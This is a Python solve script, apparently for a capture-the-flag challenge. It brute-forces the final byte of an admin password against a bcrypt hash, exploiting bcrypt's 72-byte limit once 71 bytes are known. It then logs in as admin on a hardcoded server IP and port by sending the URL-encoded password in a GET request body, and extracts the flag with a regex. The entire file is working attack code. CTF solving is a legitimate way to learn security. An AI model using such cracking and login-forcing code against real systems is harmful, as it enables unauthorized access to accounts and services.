#!/usr/bin/env python3
import http.client
import urllib.parse
import bcrypt
import itertools
import sys
import re

######################
# PART 1: ADMIN PASSWORD BRUTE-FORCE
######################

# The bcrypt hash present in the application
admin_hash = b'$2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK'

# The known part of the admin password.
# From the challenge (based on the comments), we know the first 71 bytes.
known = b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76'

print("Length of the known part:", len(known))
# bcrypt uses a maximum of 72 bytes, so there are 72 - len(known) bytes to brute-force
missing = 72 - len(known)
if missing <= 0:
    print("No bytes to brute-force, or 'known' is too long!")
    sys.exit(1)
else:
    print(f"I need to brute-force {missing} bytes")

total = 256 ** missing
print("Total combinations to try:", total)

candidate_found = None
counter = 0

# Brute-force: generate all combinations for the missing bytes
for tail in itertools.product(range(256), repeat=missing):
    candidate = known + bytes(tail)
    counter += 1
    # Check if this candidate produces the correct hash
    if bcrypt.checkpw(candidate, admin_hash):
        candidate_found = candidate
        print("\n[+] Password found!")
        print("The admin password (raw bytes) is:")
        print(candidate)
        print("In hex:", candidate.hex())
        break
    if counter % 10000 == 0:
        print(f"Checked {counter} combinations...")

if candidate_found is None:
    print("No candidate produced the correct hash.")
    sys.exit(1)

######################
# PART 2: SEND REQUEST TO THE SERVER
######################

# Convert the found password to URL encoding.
# This way, when the server does:
#   password = urllib.parse.unquote_to_bytes(password)
# it will get the exact correct bytes.
url_encoded_pw = urllib.parse.quote_from_bytes(candidate_found)
print("\nURL-encoded password:")
print(url_encoded_pw)

# Build the form-urlencoded data for the request.
data = f"username=admin&password={url_encoded_pw}"

# Set the target server parameters
HOST = "52.59.124.14"
PORT = 5013

print("\nSending GET request (with body) to the server...")
conn = http.client.HTTPConnection(HOST, PORT)

# Manually build a GET request with body:
conn.putrequest("GET", "/")
conn.putheader("Content-Type", "application/x-www-form-urlencoded")
conn.putheader("Content-Length", str(len(data)))
conn.endheaders()
conn.send(data.encode())

response = conn.getresponse()
print("\nServer response:")
print(response.status, response.reason)
print("\nFLAG: ", re.search(r"ENO\{.*?\}", response.read().decode()).group(0))
conn.close()
